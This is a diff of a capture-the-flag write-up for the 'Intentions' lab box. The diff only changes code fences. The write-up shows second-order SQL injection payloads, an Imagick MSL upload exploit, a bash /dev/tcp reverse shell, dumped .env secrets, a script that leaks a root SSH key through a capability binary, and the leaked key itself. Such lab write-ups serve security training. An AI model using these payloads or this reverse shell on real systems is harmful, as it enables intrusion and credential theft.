@@ -1,7 +1,7 @@
 # Reconnaissance
 ## Nmap Enumeration
 - We pass the following commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.220
 nmap -sU --top-ports=10 -vv 10.10.11.220
 --------------------------------------------------------------------------------
@@ -27,7 +27,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Directory search
 - Nothing in ffuf, gobuster vhost, 
 - Dirsearch (Gobuster dir search also worked):
-	```bash
+	```
 dirsearch -u http://intentions.htb/
 
 ---OUTPUT---
@@ -41,7 +41,7 @@ dirsearch -u http://intentions.htb/
 [19:10:17] 301 -  178B  - /storage  ->  http://intentions.htb/storage/      
 ```
 - Gobuster on /storage/
-	```bash
+	```
 gobuster dir -u http://intentions.htb/storage/ dns --wordlist /usr/share/wordlists/dirb/big.txt
 
 ---OUTPUT---
@@ -52,7 +52,7 @@ gobuster dir -u http://intentions.htb/storage/ dns --wordlist /usr/share/wordlis
 
 ```
 - We also check /js as it holds some scripts:
-	```bash
+	```
 gobuster dir -u http://intentions.htb/js dns --wordlist /usr/share/wordlists/dirb/big.txt -x js -o gobuster.js
 
 # can then grep gobuster.js for Status 200 responses
@@ -89,7 +89,7 @@ gobuster dir -u http://intentions.htb/js dns --wordlist /usr/share/wordlists/dir
 	- After loggin ing (creating user then login) we can inspect network to see a lot of image files and some javascript files
 		- all javascript is in /js/ directory
 			- Gobuster enumerate it to find scripts
-				```bash
+				```
 gobuster dir -u 10.10.11.220 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.root -f
 gobuster dir -u 10.10.11.220/js -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x js -o gobuster.js 
 ```
@@ -98,7 +98,7 @@ gobuster dir -u 10.10.11.220/js -w /opt/SecLists/Discovery/Web-Content/raft-smal
 			- adding `'` breakings the input and the feed goes blank
 				- Alternatively from this website we can grab the following command which can be used to check if there is any vulnerability in the first place and then remove character by character to identify which character is involved:
 					- https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
-						```bash
+						```
 ${{<%[%'"}}%\.
 ```
 			- Spaces are removed ( tried ' or 1=1-- - and it saved w/o spaces)
@@ -106,7 +106,7 @@ ${{<%[%'"}}%\.
 	- **NEW TOOL**
 		- https://sqlfiddle.com/mysql/online-compiler
 			- we use this test code to play with and find the code below:
-			```bash
+			```
 -- INIT database
 CREATE TABLE Product (
   ProductID INT AUTO_INCREMENT KEY,
@@ -129,30 +129,30 @@ SELECT * FROM Product WHERE FIND_IN_SET(genres,"animals,food") #this is the comm
 	- This is because - looks for space as a delimiter and a comment isn't the same as a space in that check so it doesn't comment out the rest of the line leading to an error and the feed not returning any value.
 	- There are many ways to comment, I tried # and /**/.
 		- When using only # so the command:
-			```bash
+			```
 food,')#OR#1=1#
 ```
 			- The feed showed only food
 			- This is because # comments out everything ahead of it so it just checks the first argument  i.e just food
 		- We tried using `/**/` only but that returned with an error too probably cause we closed the comment at the end with this
-			```bash
+			```
 food,')/**/OR/**/1=1/**/
 food,)/**/OR/**/1=1/*
 ```
 		- Finally we tried the mix of the two using # to comment out the end but `/**/` for spaces
-			```bash
+			```
 food,)/**/OR/**/1=1#
 ```
 			
 - robots.txt
-	```bash
+	```
 User-agent: *
 Disallow:
 ```
 ### Enumeration with BurpSuite
 - Now we know the possible injection point and where we get the output, we capture these packets on Burpsuite i.e:
 	- When we update the genre we call (the input in the profile page)
-		```bash
+		```
 POST /api/v1/gallery/user/genres HTTP/1.1
 Host: intentions.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -172,7 +172,7 @@ Priority: u=0
 {"genres":"food,')/**/OR/**/1=1#"}
 ```
 	- The feed page which calls the tags(genres) for these images to be shown in the 
-		```bash
+		```
 GET /api/v1/gallery/user/feed HTTP/1.1
 Host: intentions.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -195,16 +195,16 @@ Cookie: XSRF-TOKEN=eyJpdiI6IkErQWtDZDl2NGRvZUdUMkc2MlJNUXc9PSIsInZhbHVlIjoia3l0Z
 			- In order for UNION to work it needs find out how many columns
 				- This can be done with the `ORDER BY <Number>` command
 					- When the command does not response, we are asking for too many columns
-					```bash
+					```
 "genres":"')/**/ORDER/**/BY/**/5#"
 ```
 					- The command returns with an empty data value whereas if we enter 6 it responds with server error, implying there are 5 columns.
 				- Next our basic exploit will be in one of the 5 entries, i.e, we can input our code in any value from 1 to 5 in the following command:
-					```bash
+					```
 "genres":"')/**/UNION/**/SELECT/**/1,2,3,4,5#"}
 ```
 			- Checking with `@@version`
-				```bash
+				```
 "genres":"')/**/UNION/**/SELECT/**/1,(SELECT/**/@@version),3,4,5#"}
 
 ---OUTPUT---
@@ -217,7 +217,7 @@ Cookie: XSRF-TOKEN=eyJpdiI6IkErQWtDZDl2NGRvZUdUMkc2MlJNUXc9PSIsInZhbHVlIjoia3l0Z
 					- https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html
 						- In here we find SCHEMATA > SCHEMA_NAME for database names
 			- Now we use group_concat like in Monitored box to enumerate and find database name			
-				```bash
+				```
 "genres":"')/**/UNION/**/SELECT/**/1,(SELECT/**/group_concat(SCHEMA_NAME)/**/from/**/information_schema.schemata),3,4,5#"
 
 ---OUTPUT---
@@ -227,7 +227,7 @@ Cookie: XSRF-TOKEN=eyJpdiI6IkErQWtDZDl2NGRvZUdUMkc2MlJNUXc9PSIsInZhbHVlIjoia3l0Z
 			- We can navigate to columns in sql website
 				- https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html
 					- TABLE_SCHEMA (database name), TABLE_NAME (table name), and COLUMN_NAME (column name) are of interest
-						```bash
+						```
 "genres":"')/**/UNION/**/SELECT/**/1,(SELECT/**/GROUP_CONCAT(TABLE_NAME,':',COLUMN_NAME)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_SCHEMA/**/like/**/'intentions'),3,4,5#"
 
 ---OUTPUT---
@@ -237,7 +237,7 @@ Cookie: XSRF-TOKEN=eyJpdiI6IkErQWtDZDl2NGRvZUdUMkc2MlJNUXc9PSIsInZhbHVlIjoia3l0Z
 						- Personal Access Tokens : token, tokenable_id, tokenable_type. id, name, last_used
 						- users: name, password, admin
 		- Next we try to grab the users, admin and password and see if it works, if not we might also need the token (i'm guessing we will)
-			```bash
+			```
 "')/**/UNION/**/SELECT/**/1,(SELECT/**/GROUP_CONCAT(admin,':',name,':',password,':',email)/**/FROM/**/users),3,4,5#"
 
 ---COPY-TO-VI---
@@ -277,14 +277,14 @@ vi creds > Copy here
 			- I checked just admin and say and lot of 0's and a few 1's..so I'm assuming 1 would imply it is admin
 				- steve and greg
 			- I try to crack their password with john
-				```bash
+				```
 vi hash > Copy the 2 hashes
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 				- We get nothing
 ### SQLMap with second order SQLi (NON OSCP Route)
 - To make it work we need to use both our request packets in burpsuite (make sure the post request doesn't have our injection already included in the input):
-	```bash
+	```
 sqlmap -r sqlpost.req --second-req sqlget.req --dbms mysql --batch --tamper=space2comment --level=5 --flush-session --dump --threads=10 --output-dir=sqlmap
 ```
 	- --tamper when issues like no space etc
@@ -298,7 +298,7 @@ sqlmap -r sqlpost.req --second-req sqlget.req --dbms mysql --batch --tamper=spac
 			- `If-None-Match`
 	- Generally api is a good term to search as we could find something related to an authentication api for the admin
 		- we find an /api/v2/admin/..
-			```bash
+			```
 /api/v2/admin/image/
 /api/v2/admin/image/modify
 /api/v2/gallery/images     # can access but just a copy of the normal v1 gallery
@@ -307,7 +307,7 @@ sqlmap -r sqlpost.req --second-req sqlget.req --dbms mysql --batch --tamper=spac
 			- When we try to access them (other than gallery/images) we are redirected to the v1/login page
 		- Also initially in our scanning of packets we saw it used /api/v1/ a lot
 		- We also find this :
-			```bash
+			```
 "Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                
 
 Let me know if you spot any bugs. \n                
@@ -333,7 +333,7 @@ The v2 API also comes with some neat features we are testing that could allow us
 			- Try to capture in BurpSuite
 				- leads to the /image/modify route
 				- On repeater we see our request has a path
-					```bash
+					```
 "path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg",
 "effect":"charcoal"
 ```
@@ -343,7 +343,7 @@ The v2 API also comes with some neat features we are testing that could allow us
 					- We try to reach our machine using our IP and port and we get a response on our listener but terminates connection immediately
 						- So there is SSRF...
 				- and our response has some data in base64
-					```bash
+					```
 data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4gIcSUNDX1BST0ZJTEUAAQEAAAIMbGNtcwIQAABtbnRyUkdCIFhZWiAH3AABABkAAwApADlhY3NwQVBQTAAAAAAAA...
 ......
 ....LImvgaei24zGbHwf2v9KWG5j7j7PBisuZv2vNPNmvf/ALnStu4btKnwGCij5TfozxaxkYiXZUkUjXOqphgVFtwsXbz7q6zaGAjl2NysjZny4znM9iLi+FjTTwArSnw6typwU5Jzx4PEIBwszwk/yijQ2//Z
@@ -368,7 +368,7 @@ data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4gIcSUNDX1BST0ZJTEUAAQEAAAIMb
 	- add `[10x10]` to the image path]
 		- we see the it returns fine but the content output has reduced so it's working
 	- We note the final exploit:
-		```bash
+		```
 Class Name: Imagick
 Argument Value: vid:msl:/tmp/php*
 
@@ -390,7 +390,7 @@ Content-Type: text/plain
 --ABC--
 ```
 	- We add the exploit details to our packet:
-		```bash
+		```
 POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=charcoal HTTP/1.1
 Host: 10.10.11.220
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -425,7 +425,7 @@ Content-Type: text/plain
 			- www-data
 - Now we can add our exploit to this.
 	- Capture the file location in BurpSuite (might need to upload again if taken too long)
-	```bash
+	```
 cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'
 URL Encode it
 cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9999+0>%261'
@@ -443,7 +443,7 @@ cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9999+0>%261'
 	- database
 	- confiig/auth.php
 - .env file gives us some data :
-	```bash
+	```
 cd /var/www/html/intentions/
 cat .env
 
@@ -458,14 +458,14 @@ DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
 JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt
 ```
 - got the .git file we can compress it, and put it in the public directory where we can pull it from our machine as it's reachable to us.
-	```bash
+	```
 ---TARGET-MACHINE---
 tar -czvf public/git.tar.gz .git
 ---LOCAL-MACHINE---
 wget http://intentions.htb/git.tar.gz
 ```
 - We then do some git enumeration
-	```bash
+	```
 git log 
 git diff 
 OR
@@ -484,7 +484,7 @@ $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 
 		- strings doesn't work
 		- stat shows no setuid existing
 		- **NEW COMMAND** : 
-			```bash
+			```
 getcap /opt/scanner/scanner
 
 ---OUTPUT---
@@ -493,7 +493,7 @@ getcap /opt/scanner/scanner
 			- And since it's owned by root, this binary can basically read anything as root
 				- maybe can read ssh key?
 		- We also do:
-			```bash
+			```
 /opt/scanner/scanner
 
 ---OUTPUT---
@@ -512,7 +512,7 @@ The copyright_scanner application provides the capability to evaluate a single f
 ```
 		- To test we try to execute this scanner. 
 			- First we get md5 sum of first entry which is root in /etc/passwd/
-				```bash
+				```
 cat /etc/passwd | head -1
 echo -n r md5sum
 
@@ -520,7 +520,7 @@ echo -n r md5sum
 4b43b0aee35624cd95b910189b3dc231
 ```
 			- Then we check the hash with the scanner
-				```bash
+				```
 /opt/scanner/scanner -c /etc/passwd -l 1 -s 4b43b0aee35624cd95b910189b3dc231
 /opt/scanner/scanner -c /etc/passwd -l 1 -s 4b43b0aee35624cd95b910189b3dc231
 
@@ -564,7 +564,7 @@ while LOOP:
 ```
 	- We can test each section dynamically in target to see if it works.
 		- first we try brute and check if it is working
-			```bash
+			```
 python3
 import subprocess
 import hashlib
@@ -589,7 +589,7 @@ brute ("/root/.ssh/id_rsa","--") # key stats with ----BEGIN..---
 					- If `guess` is `ro` then it checks the first 2 characters of the file, hashes it, and compares it with the hash of `guess`, i.e the hash of `ro`. If it matches, it returns as True, if not, it returns as False.
 						- When checking the code, we would see that it returns something when true, but nothing when false, so we created the loop to check that if the output is >0 i.e there is some output, it is True, else it is False.
 	- The final LOOP explanation:
-		```bash
+		```
 LOOP = True
 guess = "-----BEGIN OPENSSH PRIVATE KEY-----"
 print(guess,end="")
@@ -613,7 +613,7 @@ while LOOP:
 			- If `guess`+c returns true, c is appended to `guess`
 				- This goes on until all the characters in the file are read and matched, printing the output
 	- Exploit this python script in target:
-		```bash
+		```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
@@ -654,7 +654,7 @@ DVJTokldQ0d4ghAAAAD3Jvb3RAaW50ZW50aW9ucwECAw==
 -----END OPENSSH PRIVATE KEY-----
 ```
 - Save it on our local machine, assign privileges and ssh into target as root
-	```bash
+	```
 vi root > copy key
 chmod 0600 root
 ssh -i root root@intentions.htb
@@ -663,7 +663,7 @@ ssh -i root root@intentions.htb
 
 ## Better script from walkthrough
 - script
-	```bash
+	```
 import string
 import hashlib
 import subprocess
@@ -735,7 +735,7 @@ print("Done")
 **Due to sqlmap running when refreshing the page**
 - In profile section I notice when trying to do ' OR 1=1-- - the spaces get removed
 	- Using # as a space i tried passing the command and on refreshing the page I see some extra SQL code. Everytime I save data it keeps changing:
-		```bash
+		```
 '#OR#1=1--#-'
 
 ---OUTPUT---
